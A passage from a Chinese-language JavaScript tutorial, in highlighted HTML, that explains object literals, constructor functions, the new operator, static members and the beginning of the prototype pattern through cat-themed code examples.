    <span class="hljs-attr">email</span>: <span class="hljs-string">"john@example.com"</span>,
    <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
    <span class="hljs-attr">interests</span>: [<span class="hljs-string">"编程"</span>, <span class="hljs-string">"游戏"</span>, <span class="hljs-string">"音乐"</span>]
};
</code></pre>
<ol start="3">
<li><strong>命名空间</strong>：组织相关功能</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">MathUtils</span> = {
    <span class="hljs-attr">PI</span>: <span class="hljs-number">3.141592653589793</span>,
    
    <span class="hljs-attr">add</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">a, b</span>) {
        <span class="hljs-keyword">return</span> a + b;
    },
    
    <span class="hljs-attr">multiply</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">a, b</span>) {
        <span class="hljs-keyword">return</span> a * b;
    },
    
    <span class="hljs-attr">randomInt</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">min, max</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * (max - min + <span class="hljs-number">1</span>)) + min;
    }
};

<span class="hljs-comment">// 使用命名空间</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MathUtils</span>.<span class="hljs-property">PI</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MathUtils</span>.<span class="hljs-title function_">add</span>(<span class="hljs-number">5</span>, <span class="hljs-number">3</span>));
</code></pre>
<ol start="4">
<li><strong>枚举值</strong>：定义常量</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Colors</span> = {
    <span class="hljs-attr">RED</span>: <span class="hljs-string">"#FF0000"</span>,
    <span class="hljs-attr">GREEN</span>: <span class="hljs-string">"#00FF00"</span>, 
    <span class="hljs-attr">BLUE</span>: <span class="hljs-string">"#0000FF"</span>,
    <span class="hljs-attr">WHITE</span>: <span class="hljs-string">"#FFFFFF"</span>,
    <span class="hljs-attr">BLACK</span>: <span class="hljs-string">"#000000"</span>
};

<span class="hljs-comment">// 使用枚举</span>
button.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-title class_">Colors</span>.<span class="hljs-property">BLUE</span>;
</code></pre>
<h3 data-id="heading-10">第三章：构造函数模式——真正的"制造工厂"</h3>
<h4 data-id="heading-11">3.1 从手工制作到批量生产</h4>
<p>当我们发现需要创建很多相似对象时，对象字面量就显得效率低下了。这时，构造函数模式应运而生。</p>
<p><strong>现实比喻</strong>：</p>
<ul>
<li><strong>对象字面量</strong>：像手工雕刻，每只猫都要从头开始</li>
<li><strong>构造函数</strong>：像使用模具，一次设计，多次生产</li>
</ul>
<h4 data-id="heading-12">3.2 构造函数的基本用法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 定义一个猫的"模具"——构造函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color, age</span>) {
    <span class="hljs-comment">// new Cat() 被调用时，发生以下事情：</span>
    <span class="hljs-comment">// 1. 创建一个新的空对象 {}</span>
    <span class="hljs-comment">// 2. this 指向这个新对象</span>
    <span class="hljs-comment">// 3. 执行构造函数内的代码</span>
    <span class="hljs-comment">// 4. 返回这个新对象（默认情况）</span>
    
    <span class="hljs-comment">// 给新对象添加属性</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;     <span class="hljs-comment">// this.name 就是新对象的.name</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;   <span class="hljs-comment">// this.color 就是新对象的.color</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age || <span class="hljs-number">1</span>;  <span class="hljs-comment">// 默认年龄为1</span>
    
    <span class="hljs-comment">// 给新对象添加方法</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">food</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃"</span> + food);
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sleep</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">hours</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"要睡"</span> + hours + <span class="hljs-string">"小时"</span>);
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">getInfo</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"是一只"</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> + <span class="hljs-string">"岁的"</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> + <span class="hljs-string">"猫"</span>;
    };
}

<span class="hljs-comment">// 使用构造函数创建实例（用模具生产）</span>
<span class="hljs-keyword">const</span> garfield = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"加菲猫"</span>, <span class="hljs-string">"黄色"</span>, <span class="hljs-number">5</span>);
<span class="hljs-keyword">const</span> doraemon = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"哆啦A梦"</span>, <span class="hljs-string">"蓝色"</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 机器猫，年龄为0</span>
<span class="hljs-keyword">const</span> helloKitty = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"凯蒂猫"</span>, <span class="hljs-string">"白色"</span>, <span class="hljs-number">10</span>);

<span class="hljs-comment">// 使用这些猫</span>
garfield.<span class="hljs-title function_">eat</span>(<span class="hljs-string">"意大利面"</span>);        <span class="hljs-comment">// 输出：加菲猫在吃意大利面</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(doraemon.<span class="hljs-title function_">getInfo</span>()); <span class="hljs-comment">// 输出：哆啦A梦是一只0岁的蓝色猫</span>
helloKitty.<span class="hljs-title function_">sleep</span>(<span class="hljs-number">12</span>);           <span class="hljs-comment">// 输出：凯蒂猫要睡12小时</span>
</code></pre>
<h4 data-id="heading-13">3.3 深入理解 <code>new</code> 关键字</h4>
<p><code>new</code> 操作符是构造函数模式的核心，它背后做了很多工作：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 手动模拟 new 操作符的工作</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">customNew</span>(<span class="hljs-params">constructor, ...args</span>) {
    <span class="hljs-comment">// 1. 创建一个空对象</span>
    <span class="hljs-keyword">const</span> obj = {};
    
    <span class="hljs-comment">// 2. 设置原型链：新对象的__proto__指向构造函数的prototype</span>
    obj.<span class="hljs-property">__proto__</span> = constructor.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;
    
    <span class="hljs-comment">// 3. 绑定this并执行构造函数</span>
    <span class="hljs-keyword">const</span> result = constructor.<span class="hljs-title function_">apply</span>(obj, args);
    
    <span class="hljs-comment">// 4. 确保返回一个对象</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'object'</span> ? result : obj;
}

<span class="hljs-comment">// 使用自定义的new</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-keyword">const</span> cat = <span class="hljs-title function_">customNew</span>(<span class="hljs-title class_">Cat</span>, <span class="hljs-string">"咪咪"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">name</span>);  <span class="hljs-comment">// "咪咪"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Cat</span>);  <span class="hljs-comment">// true</span>
</code></pre>
<h4 data-id="heading-14">3.4 构造函数的重要特性</h4>
<h5 data-id="heading-15">1. <code>constructor</code> 属性</h5>
<p>每个通过构造函数创建的对象都有一个 <code>constructor</code> 属性，指向创建它的构造函数：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"咪咪"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">constructor</span>);           <span class="hljs-comment">// 输出：function Cat(name) {...}</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Cat</span>);   <span class="hljs-comment">// 输出：true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Cat</span>);        <span class="hljs-comment">// 输出：true</span>

<span class="hljs-comment">// 通过constructor创建新对象</span>
<span class="hljs-keyword">const</span> cat2 = <span class="hljs-keyword">new</span> cat.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">"小黑"</span></span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat2.<span class="hljs-property">name</span>);  <span class="hljs-comment">// 输出：小黑</span>
</code></pre>
<h5 data-id="heading-16">2. 构造函数返回值</h5>
<p>构造函数可以有返回值，但会影响 <code>new</code> 的行为：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    
    <span class="hljs-comment">// 情况1：返回基本类型（被忽略）</span>
    <span class="hljs-comment">// return 123;      // 忽略，仍然返回this</span>
    <span class="hljs-comment">// return "hello";  // 忽略，仍然返回this</span>
    
    <span class="hljs-comment">// 情况2：返回对象（替代新对象）</span>
    <span class="hljs-comment">// return { custom: "对象" };  // 返回这个对象，而不是this</span>
}

<span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"咪咪"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">name</span>);  <span class="hljs-comment">// 输出：咪咪</span>
</code></pre>
<h5 data-id="heading-17">3. 静态属性和方法</h5>
<p>构造函数本身也是对象，可以有自己的属性和方法：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name, color</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
}

<span class="hljs-comment">// 静态属性：属于构造函数本身，不属于实例</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property">species</span> = <span class="hljs-string">"猫科动物"</span>;
<span class="hljs-title class_">Cat</span>.<span class="hljs-property">totalCats</span> = <span class="hljs-number">0</span>;

<span class="hljs-comment">// 静态方法：通过构造函数调用，不是实例调用</span>
<span class="hljs-title class_">Cat</span>.<span class="hljs-property">createFromJSON</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">jsonString</span>) {
    <span class="hljs-title class_">Cat</span>.<span class="hljs-property">totalCats</span>++;  <span class="hljs-comment">// 创建时计数</span>
    <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(jsonString);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(data.<span class="hljs-property">name</span>, data.<span class="hljs-property">color</span>);
};

<span class="hljs-title class_">Cat</span>.<span class="hljs-property">getTotalCats</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Cat</span>.<span class="hljs-property">totalCats</span>;
};

<span class="hljs-comment">// 使用静态成员</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Cat</span>.<span class="hljs-property">species</span>);  <span class="hljs-comment">// 猫科动物</span>

<span class="hljs-keyword">const</span> jsonStr = <span class="hljs-string">'{"name":"小黄","color":"黄色"}'</span>;
<span class="hljs-keyword">const</span> cat1 = <span class="hljs-title class_">Cat</span>.<span class="hljs-title function_">createFromJSON</span>(jsonStr);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">name</span>);       <span class="hljs-comment">// 小黄</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Cat</span>.<span class="hljs-title function_">getTotalCats</span>()); <span class="hljs-comment">// 1</span>

<span class="hljs-comment">// 静态方法不能通过实例调用</span>
<span class="hljs-keyword">const</span> cat2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"小白"</span>, <span class="hljs-string">"白色"</span>);
<span class="hljs-comment">// cat2.getTotalCats();  // 错误：不是函数</span>
</code></pre>
<h4 data-id="heading-18">3.5 构造函数模式的内存问题</h4>
<p>构造函数模式有一个严重的缺陷：<strong>方法重复创建</strong>。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    
    <span class="hljs-comment">// 问题：每次new Cat()都会创建新的函数对象</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sleep</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在睡觉"</span>);
    };
}

<span class="hljs-keyword">const</span> cat1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"猫1"</span>);
<span class="hljs-keyword">const</span> cat2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"猫2"</span>);
<span class="hljs-keyword">const</span> cat3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"猫3"</span>);

<span class="hljs-comment">// 每个实例都有自己独立的eat和sleep方法</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat1.<span class="hljs-property">eat</span> === cat2.<span class="hljs-property">eat</span>);      <span class="hljs-comment">// false，不是同一个函数</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat2.<span class="hljs-property">sleep</span> === cat3.<span class="hljs-property">sleep</span>);  <span class="hljs-comment">// false，不是同一个函数</span>

<span class="hljs-comment">// 内存浪费示意图：</span>
<span class="hljs-comment">// cat1 → {name, eat函数1, sleep函数1}</span>
<span class="hljs-comment">// cat2 → {name, eat函数2, sleep函数2}  </span>
<span class="hljs-comment">// cat3 → {name, eat函数3, sleep函数3}</span>
<span class="hljs-comment">// 每个函数都是独立的，占用独立的内存空间</span>

<span class="hljs-comment">// 创建100只猫，就有100个eat函数和100个sleep函数！</span>
<span class="hljs-comment">// 实际功能完全一样，这是巨大的内存浪费</span>
</code></pre>
<h4 data-id="heading-19">3.6 防御性编程：防止忘记 <code>new</code></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 方案1：使用严格模式 + 检查</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-comment">// 严格模式下，this在普通调用时为undefined</span>
    <span class="hljs-string">"use strict"</span>;
    
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span> === <span class="hljs-literal">undefined</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Cat构造函数必须使用new调用"</span>);
    }
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// 方案2：自动纠正</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-comment">// 如果this不是Cat的实例（说明没有用new调用）</span>
    <span class="hljs-keyword">if</span> (!(<span class="hljs-variable language_">this</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Cat</span>)) {
        <span class="hljs-comment">// 自动调用new</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(name);
    }
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// 方案3：ES6 new.target</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-comment">// new.target在new调用时指向构造函数，否则为undefined</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span>.<span class="hljs-property">target</span> !== <span class="hljs-title class_">Cat</span>) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"必须使用new调用Cat构造函数"</span>);
    }
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// 测试</span>
<span class="hljs-keyword">const</span> cat1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"正确"</span>);  <span class="hljs-comment">// 正常</span>
<span class="hljs-keyword">const</span> cat2 = <span class="hljs-title class_">Cat</span>(<span class="hljs-string">"也正确"</span>);    <span class="hljs-comment">// 自动纠正方案中正常，其他方案报错</span>
</code></pre>
<h4 data-id="heading-20">3.7 构造函数的实际应用场景</h4>
<h5 data-id="heading-21">1. 创建UI组件</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params">text, color</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">text</span> = text;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">"button"</span>);
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">render</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>.<span class="hljs-property">textContent</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">text</span>;
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span>;
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>;
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">onClick</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">handler</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">element</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"click"</span>, handler);
    };
}

<span class="hljs-keyword">const</span> submitBtn = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">"提交"</span>, <span class="hljs-string">"blue"</span>);
<span class="hljs-keyword">const</span> cancelBtn = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">"取消"</span>, <span class="hljs-string">"gray"</span>);

<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(submitBtn.<span class="hljs-title function_">render</span>());
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(cancelBtn.<span class="hljs-title function_">render</span>());
</code></pre>
<h5 data-id="heading-22">2. 数据模型</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">User</span>(<span class="hljs-params">id, name, email</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">email</span> = email;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">isActive</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">createdAt</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">deactivate</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">isActive</span> = <span class="hljs-literal">false</span>;
    };
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">getInfo</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> (<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.email}</span>) - <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.isActive ? <span class="hljs-string">'活跃'</span> : <span class="hljs-string">'非活跃'</span>}</span>`</span>;
    };
}

<span class="hljs-keyword">const</span> user1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"张三"</span>, <span class="hljs-string">"zhang@example.com"</span>);
<span class="hljs-keyword">const</span> user2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">2</span>, <span class="hljs-string">"李四"</span>, <span class="hljs-string">"li@example.com"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user1.<span class="hljs-title function_">getInfo</span>());
user2.<span class="hljs-title function_">deactivate</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user2.<span class="hljs-title function_">getInfo</span>());
</code></pre>
<h4 data-id="heading-23">3.8 构造函数模式的优缺点总结</h4>
<p><strong>优点</strong>：</p>
<ul>
<li><strong>类型标识</strong>：实例有明确的constructor属性</li>
<li><strong>代码复用</strong>：可以批量创建相似对象</li>
<li><strong>封装性</strong>：将创建逻辑封装在函数中</li>
<li><strong>灵活性</strong>：可以传参定制每个实例</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li><strong>内存浪费</strong>：方法在每个实例中重复创建</li>
<li><strong>性能问题</strong>：大量实例时占用大量内存</li>
<li><strong>忘记new的风险</strong>：可能导致意外创建全局变量</li>
</ul>
<p>为了解决内存浪费的问题，我们需要更高级的模式——原型模式。</p>
<h2 data-id="heading-24">第四章：原型模式——JavaScript面向对象的精髓</h2>
<h3 data-id="heading-25">4.1 从构造函数的问题到原型的解决方案</h3>
<h4 data-id="heading-26">问题的根源：内存浪费的数学计算</h4>
<p>让我们先量化构造函数模式的内存问题：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
    };
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">sleep</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在睡觉"</span>);
    };
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">play</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">"在玩耍"</span>);
    };
    <span class="hljs-comment">// 假设每个方法平均占用1KB内存</span>
}

<span class="hljs-comment">// 创建1000只猫</span>
<span class="hljs-keyword">let</span> totalMemory = <span class="hljs-number">0</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    <span class="hljs-keyword">const</span> cat = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">`猫<span class="hljs-subst">${i}</span>`</span>);
    <span class="hljs-comment">// 每只猫有3个方法，每个方法1KB</span>
    totalMemory += <span class="hljs-number">3</span>; <span class="hljs-comment">// KB</span>
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`总内存占用: <span class="hljs-subst">${totalMemory}</span>KB = <span class="hljs-subst">${totalMemory / <span class="hljs-number">1024</span>}</span>MB`</span>);
<span class="hljs-comment">// 输出：总内存占用: 3000KB = 2.93MB</span>

<span class="hljs-comment">// 但实际上，这1000个eat方法功能完全相同！</span>
<span class="hljs-comment">// 它们在内存中有1000个副本，这是巨大的浪费</span>
</code></pre>
<h4 data-id="heading-27">原型的核心思想：共享</h4>
<p>想象一个图书馆系统：</p>
<ul>
<li><strong>构造函数模式</strong>：每人都买一本相同的书（浪费钱和空间）</li>
<li><strong>原型模式</strong>：图书馆有一本书，大家都可以借阅（节约资源）</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 图书馆（原型）模式</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Library</span> = {
    <span class="hljs-comment">// 共享的书籍（方法）</span>
    <span class="hljs-attr">books</span>: {
        <span class="hljs-string">"吃的方法"</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">cat</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">name</span> + <span class="hljs-string">"在吃东西"</span>);
        },
        <span class="hljs-string">"睡的方法"</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">cat</span>) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">name</span> + <span class="hljs-string">"在睡觉"</span>);
        }
    },
    
    <span class="hljs-comment">// 借阅方法</span>
    <span class="hljs-attr">borrow</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">bookName, cat</span>) {
        <span class="hljs-keyword">const</span> method = <span class="hljs-variable language_">this</span>.<span class="hljs-property">books</span>[bookName];
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
            <span class="hljs-title function_">method</span>(cat);
        };
    }
};

<span class="hljs-comment">// 每个人（实例）不需要自己买书，只需记住借阅凭证</span>
<span class="hljs-keyword">const</span> cat1 = { <span class="hljs-attr">name</span>: <span class="hljs-string">"加菲猫"</span> };
<span class="hljs-keyword">const</span> cat2 = { <span class="hljs-attr">name</span>: <span class="hljs-string">"小白猫"</span> };

cat1.<span class="hljs-property">eat</span> = <span class="hljs-title class_">Library</span>.<span class="hljs-title function_">borrow</span>(<span class="hljs-string">"吃的方法"</span>, cat1);
cat2.<span class="hljs-property">eat</span> = <span class="hljs-title class_">Library</span>.<span class="hljs-title function_">borrow</span>(<span class="hljs-string">"吃的方法"</span>, cat2);

cat1.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// 加菲猫在吃东西</span>
cat2.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// 小白猫在吃东西</span>

<span class="hljs-comment">// 关键：两个eat方法都指向Library.books["吃的方法"]</span>
<span class="hljs-comment">// 但通过闭包绑定了各自的cat</span>
</code></pre>
<p>JavaScript的原型系统就是基于这种"共享"思想构建的，但实现更优雅。</p>
<h3 data-id="heading-28">4.2 原型（Prototype）的详细机制</h3>
<h4 data-id="heading-29">4.2.1 每个函数都有原型属性</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Cat</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// 每个函数创建时，都会自动获得一个prototype属性</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Cat</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// "object"</span>
